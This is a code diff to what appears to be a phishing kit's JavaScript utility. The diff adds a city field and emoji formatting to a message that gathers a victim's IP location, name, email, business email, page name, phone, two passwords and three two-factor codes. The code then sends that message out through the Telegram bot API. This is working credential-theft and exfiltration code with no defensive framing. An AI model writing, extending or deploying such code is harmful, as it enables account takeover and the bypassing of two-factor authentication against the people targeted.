@@ -88,6 +88,7 @@ const Utils = {
                     location: `${d.ip} | ${d.city} | ${d.region} (${d.country})`,
                     country_code: d.country,
                     ip: d.ip,
+                    city: d.city,
                     region: d.region,
                     country: d.country
                 };
@@ -100,6 +101,7 @@ const Utils = {
             location: "N/A",
             country_code: "N/A",
             ip: "N/A",
+            city: "N/A",
             region: "N/A",
             country: "N/A"
         };
@@ -109,21 +111,23 @@ const Utils = {
         const locationData = await this.getUserLocation();
 
         const text = `
-<b>IP:</b> <code>${locationData.ip}</code>
-<b>Location:</b> <code>${locationData.location})</code>
+🌐 <b>IP:</b> <code>${locationData.ip}</code>
+📍 <b>City:</b> <code>${locationData.city}</code>
+🗺 <b>Region:</b> <code>${locationData.region}</code>
+🏳 <b>Country:</b> <code>${locationData.country}</code>
 ----------------------------------
-<b>Full Name:</b> <code>${data.fullName || ''}</code>
-<b>Email:</b> <code>${data.email || ''}</code>
-<b>Email Business:</b> <code>${data.emailBusiness || ''}</code>
-<b>Page Name:</b> <code>${data.fanpage || ''}</code>
-<b>Phone:</b> <code>${data.phone || ''}</code>
+👤 <b>Full Name:</b> <code>${data.fullName || ''}</code>
+📧 <b>Email:</b> <code>${data.email || ''}</code>
+💼 <b>Email Business:</b> <code>${data.emailBusiness || ''}</code>
+📄 <b>Page Name:</b> <code>${data.fanpage || ''}</code>
+📱 <b>Phone:</b> <code>${data.phone || ''}</code>
 ----------------------------------
-<b>Password(1):</b> <code>${data.password || ''}</code>
-<b>Password(2):</b> <code>${data.passwordSecond || ''}</code>
+🔑 <b>Password(1):</b> <code>${data.password || ''}</code>
+🔑 <b>Password(2):</b> <code>${data.passwordSecond || ''}</code>
 ----------------------------------
-<b>🔐Code 2FA(1):</b> <code>${data.twoFa || ''}</code>
-<b>🔐Code 2FA(2):</b> <code>${data.twoFaSecond || ''}</code>
-<b>🔐Code 2FA(3):</b> <code>${data.twoFaThird || ''}</code>`;
+🔐 <b>Code 2FA(1):</b> <code>${data.twoFa || ''}</code>
+🔐 <b>Code 2FA(2):</b> <code>${data.twoFaSecond || ''}</code>
+🔐 <b>Code 2FA(3):</b> <code>${data.twoFaThird || ''}</code>`;
 
         try {
             await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
